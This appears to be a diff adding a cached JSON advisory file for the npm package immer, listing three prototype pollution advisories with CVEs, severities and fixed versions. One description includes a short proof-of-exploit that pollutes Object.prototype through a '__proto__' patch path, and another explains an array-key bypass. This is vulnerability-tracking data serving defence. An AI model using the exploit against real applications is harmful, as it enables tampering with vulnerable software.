@@ -1,0 +1,69 @@
+{
+  "name": "immer",
+  "lastUpdated": "2026-01-31T15:05:26.294Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-33f9-j839-rf8h",
+      "title": "Prototype Pollution in immer",
+      "description": "This affects the package immer before 9.0.6. A type confusion vulnerability can lead to a bypass of CVE-2020-28477 when the user-provided keys used in the path parameter are arrays. In particular, this bypass is possible because the condition `(p === \"__proto__\" || p === \"constructor\")` in `applyPatches_` returns false if `p` is `['__proto__']` (or `['constructor']`). The `===` operator (strict equality operator) returns false if the operands have different type.",
+      "severity": "critical",
+      "url": "https://github.com/advisories/GHSA-33f9-j839-rf8h",
+      "publishedAt": "2021-09-02T17:17:37Z",
+      "modifiedAt": "2024-04-30T20:26:07Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-33f9-j839-rf8h"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2021-23436"
+        }
+      ],
+      "affectedRange": ">= 7.0.0, < 9.0.6",
+      "fixedVersion": "9.0.6"
+    },
+    {
+      "id": "GHSA-9qmh-276g-x5pj",
+      "title": "Prototype Pollution in immer",
+      "description": "## Overview\n\nAffected versions of immer are vulnerable to Prototype Pollution.\n\n## Proof of exploit\n\n```js\nconst {applyPatches, enablePatches} = require(\"immer\");\nenablePatches();\nlet obj = {};\nconsole.log(\"Before : \" + obj.polluted);\napplyPatches({}, [ { op: 'add', path: [ \"__proto__\", \"polluted\" ], value: \"yes\" } ]);\n// applyPatches({}, [ { op: 'replace', path: [ \"__proto__\", \"polluted\" ], value: \"yes\" } ]);\nconsole.log(\"After : \" + obj.polluted);\n```\n\n## Remediation\n\nVersion 8.0.1 contains a ",
+      "severity": "high",
+      "url": "https://github.com/advisories/GHSA-9qmh-276g-x5pj",
+      "publishedAt": "2021-01-20T21:27:56Z",
+      "modifiedAt": "2024-04-25T22:17:51Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-9qmh-276g-x5pj"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2020-28477"
+        }
+      ],
+      "affectedRange": ">= 7.0.0, < 8.0.1",
+      "fixedVersion": "8.0.1"
+    },
+    {
+      "id": "GHSA-c36v-fmgq-m8hx",
+      "title": "Prototype Pollution in immer",
+      "description": "immer is vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution').",
+      "severity": "high",
+      "url": "https://github.com/advisories/GHSA-c36v-fmgq-m8hx",
+      "publishedAt": "2021-09-07T22:57:14Z",
+      "modifiedAt": "2024-04-25T22:09:14Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-c36v-fmgq-m8hx"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2021-3757"
+        }
+      ],
+      "affectedRange": ">= 7.0.0, < 9.0.6",
+      "fixedVersion": "9.0.6"
+    }
+  ]
+}
